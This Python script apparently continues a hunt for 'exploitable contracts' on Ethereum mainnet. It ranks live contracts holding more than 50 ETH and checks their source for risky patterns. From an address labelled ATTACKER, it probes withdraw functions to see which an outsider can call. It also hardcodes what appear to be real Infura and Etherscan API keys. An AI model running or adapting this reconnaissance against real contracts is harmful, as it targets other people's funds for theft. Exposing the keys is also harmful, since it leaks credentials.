#!/usr/bin/env python3
"""
Continue scanning for exploitable contracts
Focus on unverified contracts with special patterns
"""
import json
import subprocess
import time

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def eth_call(to, data, from_addr=None):
    call_obj = {"to": to, "data": data}
    if from_addr:
        call_obj["from"] = from_addr
    return rpc_call("eth_call", [call_obj, "latest"])

def get_source(addr):
    url = f"https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getsourcecode&address={addr}&apikey={ETHERSCAN_API}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    try:
        data = json.loads(result.stdout)
        if data.get("status") == "1" and data.get("result"):
            return data["result"][0]
        return None
    except:
        return None

ATTACKER = "0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF"

# Load scan results
with open("scan_results.json", "r") as f:
    data = json.load(f)

# Get all high value targets not yet analyzed
high_value = data["high_value"]

# Skip Parity proxies and already analyzed
skip_patterns = ["PARITY", "0x2ccfa", "0xdbfb5", "0xb958a", "0x5eee3", "0xf74bf"]

print("=" * 80)
print("CONTINUING SCAN - LOOKING FOR VULNERABILITIES")
print("=" * 80)

targets_checked = 0
for addr, balance, ctype in high_value:
    if any(p in addr.lower() or p in ctype for p in skip_patterns):
        continue
    
    if balance < 50:  # Only check >50 ETH
        continue
    
    targets_checked += 1
    if targets_checked > 20:  # Limit to 20 more targets
        break
    
    print(f"\n{'='*70}")
    print(f"{addr} - {balance:.2f} ETH - {ctype}")
    print("=" * 70)
    
    # Verify balance
    bal = rpc_call("eth_getBalance", [addr, "latest"])
    actual_bal = int(bal['result'], 16) / 1e18 if bal else 0
    if actual_bal < 1:
        print("  Balance gone, skipping")
        continue
    
    # Get source
    time.sleep(0.3)
    source = get_source(addr)
    
    if source:
        contract_name = source.get("ContractName", "")
        src = source.get("SourceCode", "")
        
        if contract_name:
            print(f"  Contract: {contract_name}")
        
        if src:
            # Quick vulnerability check
            vulns = []
            if "selfdestruct" in src.lower() and "onlyOwner" not in src:
                vulns.append("selfdestruct without owner check?")
            if "delegatecall" in src.lower():
                vulns.append("delegatecall present")
            if "tx.origin" in src.lower():
                vulns.append("tx.origin used")
            if ".call{" in src or ".call.value" in src:
                vulns.append("low-level call")
            
            # Look for unprotected functions
            if "function withdraw" in src.lower():
                # Check if protected
                lines = src.split('\n')
                for i, line in enumerate(lines):
                    if 'function withdraw' in line.lower():
                        context = '\n'.join(lines[i:i+5])
                        if 'onlyOwner' not in context and 'require(msg.sender' not in context:
                            vulns.append("possibly unprotected withdraw")
            
            if vulns:
                print(f"  Potential issues: {vulns}")
    else:
        print(f"  Not verified")
    
    # Test owner
    owner_resp = eth_call(addr, "0x8da5cb5b")
    if owner_resp and "result" in owner_resp:
        result = owner_resp["result"]
        if result and result != "0x" and int(result, 16) != 0:
            owner = "0x" + result[-40:]
            if owner == "0x0000000000000000000000000000000000000000":
                print(f"  [!] Owner is ZERO ADDRESS")
            else:
                print(f"  Owner: {owner[:20]}...")
    
    # Test withdraw functions
    for sel, name in [("0x3ccfd60b", "withdraw()"), ("0x2e1a7d4d", "withdraw(uint)"), ("0x51cff8d9", "withdraw(addr)")]:
        gas_resp = rpc_call("eth_estimateGas", [{"from": ATTACKER, "to": addr, "data": sel}, "latest"])
        if gas_resp and "result" in gas_resp:
            gas = int(gas_resp["result"], 16)
            if gas > 21100:  # More than base tx cost
                print(f"  {name}: callable, gas={gas}")

print(f"\n\nChecked {targets_checked} additional contracts")

